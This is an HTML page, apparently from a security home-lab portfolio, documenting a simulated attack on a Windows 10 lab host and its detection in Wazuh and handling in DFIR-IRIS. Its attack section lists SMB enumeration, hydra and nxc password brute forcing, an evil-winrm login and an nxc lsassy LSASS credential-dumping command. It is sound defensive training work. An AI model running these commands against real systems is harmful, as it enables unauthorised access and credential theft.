@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Case 2 – Windows Host Compromise Attempt</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="index.html" class="nav-item">Home</a>
+    <a href="soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="case_1.html" class="nav-item">Case 1</a>
+    <a href="case_2.html" class="nav-item active">Case 2</a>
+    <a href="case_3.html" class="nav-item">Case 3</a>
+</div>
+
+<h1>Case 2 – Windows Host Compromise Attempt</h1>
+<p>
+    This case simulates an attacker trying to compromise the Windows 10 host.
+    The investigation includes attacker activity (Kali), SIEM visibility (Wazuh), and
+    incident response workflow (DFIR‑IRIS).
+</p>
+
+<h2>1. Case Overview</h2>
+<ul>
+    <li><strong>Date:</strong> 2026‑03‑03</li>
+    <li><strong>Target:</strong> Windows 10 (10.10.10.20)</li>
+    <li><strong>Attacker:</strong> Kali Linux (10.10.10.40)</li>
+    <li><strong>Detection Source:</strong> Wazuh SIEM</li>
+    <li><strong>IR Platform:</strong> DFIR‑IRIS</li>
+</ul>
+
+<h2>2. Attack Simulation (Kali)</h2>
+<p>Summary of attacker actions performed from Kali.</p>
+
+<h3>2.1. Enumeration</h3>
+<p>Scan the Windows host.</p>
+
+<img src="images/case_2/kali_1.png" alt="kali_1">
+<img src="images/case_2/kali_2.png" alt="kali_2">
+
+<p>Attempt SMB enumeration.</p>
+
+<pre><code>smbclient -L //10.10.10.20 -N
+</code></pre>
+
+<img src="images/case_2/kali_3.png" alt="kali_3">
+
+<h3>2.2. Login Attempts</h3>
+<p>Weak credential login (simulated brute force).</p>
+
+<pre><code>sudo hydra -l administrator -P /usr/share/wordlists/rockyou.txt -t 1 smb2://10.10.10.20
+sudo nxc smb 10.10.10.20 -u administrator -p passwords.txt
+</code></pre>
+
+<img src="images/case_2/kali_4.png" alt="kali_4">
+
+<p>WinRM session try.</p>
+
+<pre><code>evil-winrm -i 10.10.10.20 -u testuser -p test123
+</code></pre>
+
+<img src="images/case_2/kali_5.png" alt="kali_5">
+
+<h3>2.3. Credential Dumping Attempt</h3>
+<p>Simulate credential dumping attempt.</p>
+
+<pre><code>sudo nxc smb 10.10.10.20 -u administrator -p 'administrator' -M lsassy
+</code></pre>
+
+<img src="images/case_2/kali_6.png" alt="kali_6">
+
+<h2>3. Detection and Analysis (Wazuh SIEM)</h2>
+<p>How Wazuh detected and logged the activity.</p>
+
+<h3>3.1. Alerts</h3>
+<p>Security events.</p>
+
+<pre><code>agent.name: "WIN10-WAZUH_AGENT" AND rule.level >= 5
+</code></pre>
+
+<img src="images/case_2/siem_1.png" alt="siem_1">
+
+<h3>3.2. Log Evidence</h3>
+<p>Failed login alerts.</p>
+
+<pre><code>agent.name: "WIN10-WAZUH_AGENT" AND rule.id: (60122 OR 60105 OR 60112)
+agent.name: "WIN10-WAZUH_AGENT" AND data.win.eventdata.logonType: 3 AND rule.level >= 5
+agent.name: "WIN10-WAZUH_AGENT" AND rule.id: 60104
+# https://github.com/wazuh/wazuh-ruleset/blob/master/rules/0580-win-security_rules.xml
+</code></pre>
+
+<img src="images/case_2/siem_2.png" alt="siem_2">
+<img src="images/case_2/siem_3.png" alt="siem_3">
+<img src="images/case_2/siem_4.png" alt="siem_4">
+
+<h3>3.3. WinRM Sessions?</h3>
+
+<pre><code>agent.name: "WIN10-WAZUH_AGENT" AND data.win.eventdata.parentImage: *wsmprovhost.exe*
+</code></pre>
+
+<img src="images/case_2/siem_5.png" alt="siem_5">
+
+<h3>3.4. Credential Dumping Detection (LSASS)</h3>
+
+<pre><code>agent.name: "WIN10-WAZUH_AGENT" AND data.win.system.eventID: 10
+</code></pre>
+
+<img src="images/case_2/siem_6.png" alt="siem_6">
+
+<h2>4. Incident Response (DFIR‑IRIS)</h2>
+<p>How the case was documented and analyzed in DFIR‑IRIS.</p>
+
+<h3>4.1. Case Creation</h3>
+
+<img src="images/case_2/iris_1.png" alt="iris_1">
+
+<h3>4.2. Evidence Added</h3>
+
+<img src="images/case_2/iris_2.png" alt="iris_2">
+
+<h3>4.3. IOCs</h3>
+
+<img src="images/case_2/iris_3.png" alt="iris_3">
+
+<h3>4.4. Timeline Reconstruction</h3>
+
+<img src="images/case_2/iris_4.png" alt="iris_4">
+
+<h2>5. MITRE ATT&CK Mapping and Conclusion</h2>
+
+<ul>
+    <li><strong>TA0007</strong> – Discovery</li>
+    <li><strong>T1046</strong> – Network Service Scanning</li>
+    <li><strong>T1135</strong> – Network Share Discovery</li>
+    <li><strong>TA0006</strong> – Credential Access</li>
+    <li><strong>T1110.001</strong> – Brute Force: Password Guessing</li>
+    <li><strong>TA0008</strong> – Lateral Movement</li>
+    <li><strong>T1021.002</strong> – Remote Services: SMB/Windows Admin Shares</li>
+    <li><strong>T1021.006</strong> – Remote Services: WinRM</li>
+    <li><strong>T1003.001</strong> – OS Credential Dumping: LSASS Memory</li>
+</ul>
+
+<img src="images/case_2/iris_5.png" alt="iris_5">
+
+<h2>6. Case Closing</h2>
+
+<p>
+The attacker performed enumeration, brute force attempts, and login attempts.  
+No compromise occurred.  
+Wazuh successfully detected the activity, and DFIR‑IRIS was used to document the investigation.
+</p>
+
+<img src="images/case_2/iris_6.png" alt="iris_6">
+
+<p><a href="index.html">← Back to Home</a></p>
+
+</body>
+</html>
